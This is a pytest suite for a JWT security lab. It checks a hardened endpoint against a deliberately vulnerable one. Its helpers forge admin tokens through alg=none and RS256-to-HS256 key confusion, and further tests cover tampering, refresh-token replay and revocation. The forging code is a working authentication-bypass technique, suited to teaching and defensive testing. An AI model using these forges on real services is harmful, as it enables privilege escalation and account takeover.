"""Attack suite for the JWT lab — mirrors TC-JWT-001..007 from the resource.

The suite is green because both sides behave as designed: /secure/* rejects
every forged token, while /vulnerable/* accepts the ones the buggy verifier
lets through. Each test documents the observable difference.
"""

import base64
import hashlib
import hmac
import json
import time
import uuid

import jwt
import pytest

from app import RSA_PRIVATE_PEM, RSA_PUBLIC_PEM, app


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def bearer(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def mint(claims, key, algorithm="RS256", header_extra=None):
    header = {"alg": algorithm, "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    return jwt.encode(claims, key, algorithm=algorithm, headers=header)


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as c:
        yield c


@pytest.fixture
def session(client):
    """Log in and return (access_token, refresh_token)."""
    r = client.post(
        "/oauth/token",
        json={"username": "qa_user", "password": "Str0ngP@ss!"},
    )
    assert r.status_code == 200
    data = r.get_json()
    return data["access_token"], data["refresh_token"]


def forged_unsigned():
    """alg=none token claiming admin — no key needed, that is the point."""
    header = b64(b'{"alg":"none","typ":"JWT"}')
    payload = b64(b'{"sub":"qa_user","role":"admin","exp":9999999999,"jti":"x1"}')
    return f"{header}.{payload}."


def forged_hs256_with_public_key():
    """HS256 token signed by hand with the RSA public key as the HMAC
    secret — the confusion forge PyJWT itself refuses to build."""
    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64(
        json.dumps(
            {
                "sub": "qa_user",
                "role": "admin",
                "exp": int(time.time()) + 600,
                "jti": uuid.uuid4().hex,
            }
        ).encode()
    )
    sig = base64.urlsafe_b64encode(
        hmac.new(
            RSA_PUBLIC_PEM, f"{header}.{payload}".encode(), hashlib.sha256
        ).digest()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}.{sig}"


def test_valid_token_grants_access_on_secure(client, session):
    """TC-JWT-001 — a correctly signed, unexpired token gets the profile."""
    access, _ = session
    r = client.get("/secure/api/profile", headers=bearer(access))
    assert r.status_code == 200
    assert r.get_json()["sub"] == "qa_user"


def test_expired_token_rejected_on_both(client):
    """TC-JWT-002 — a stale token fails on secure and vulnerable alike."""
    claims = {
        "sub": "qa_user",
        "role": "user",
        "exp": int(time.time()) - 1,
        "jti": uuid.uuid4().hex,
    }
    stale = mint(claims, RSA_PRIVATE_PEM)
    assert client.get("/secure/api/profile", headers=bearer(stale)).status_code == 401
    assert client.get("/vulnerable/api/profile", headers=bearer(stale)).status_code == 401


def test_tampered_payload_rejected_on_both(client, session):
    """TC-JWT-003 — flipping role=user to admin without resigning fails."""
    access, _ = session
    header, payload, sig = access.split(".")
    raw = base64.urlsafe_b64decode(payload + "==")
    tampered = b64(raw.replace(b'"role":"user"', b'"role":"admin"'))
    forged = f"{header}.{tampered}.{sig}"
    assert client.get("/secure/api/profile", headers=bearer(forged)).status_code == 401
    assert client.get("/vulnerable/api/profile", headers=bearer(forged)).status_code == 401


def test_alg_none_accepted_on_vulnerable(client):
    """TC-JWT-004 (vulnerable side) — unsigned tokens sail through."""
    r = client.get("/vulnerable/api/profile", headers=bearer(forged_unsigned()))
    assert r.status_code == 200
    assert r.get_json()["role"] == "admin"


def test_alg_none_rejected_on_secure(client):
    """TC-JWT-004 (secure side) — the pinned verifier never accepts `none`."""
    assert client.get("/secure/api/profile", headers=bearer(forged_unsigned())).status_code == 401


def test_rs256_as_hs256_accepted_on_vulnerable(client):
    """TC-JWT-005 (vulnerable side) — the token's alg picks the public key
    as HMAC secret, so anyone holding the public key can forge admin."""
    r = client.get(
        "/vulnerable/api/profile", headers=bearer(forged_hs256_with_public_key())
    )
    assert r.status_code == 200
    assert r.get_json()["role"] == "admin"


def test_rs256_as_hs256_rejected_on_secure(client):
    """TC-JWT-005 (secure side) — only RS256 is ever verified."""
    assert (
        client.get(
            "/secure/api/profile", headers=bearer(forged_hs256_with_public_key())
        ).status_code
        == 401
    )


def test_refresh_rotation_and_replay_rejected(client, session):
    """TC-JWT-007 — first exchange rotates, replaying the consumed token
    kills the whole family."""
    _, refresh = session
    first = client.post("/oauth/refresh", json={"refresh_token": refresh})
    assert first.status_code == 200
    new_refresh = first.get_json()["refresh_token"]

    replay = client.post("/oauth/refresh", json={"refresh_token": refresh})
    assert replay.status_code == 401

    # The family is dead: even the freshly issued refresh token fails now.
    assert (
        client.post("/oauth/refresh", json={"refresh_token": new_refresh}).status_code
        == 401
    )


def test_revoked_token_rejected_on_secure(client, session):
    """Edge table — logout lands the jti on the denylist; replay fails."""
    access, _ = session
    assert client.get("/secure/api/profile", headers=bearer(access)).status_code == 200
    client.post("/logout", headers=bearer(access))
    assert client.get("/secure/api/profile", headers=bearer(access)).status_code == 401


def test_revoked_token_still_valid_on_vulnerable(client, session):
    """Edge table — the buggy verifier has no denylist, so a logged-out
    token keeps working until natural expiry."""
    access, _ = session
    client.post("/logout", headers=bearer(access))
    assert client.get("/vulnerable/api/profile", headers=bearer(access)).status_code == 200
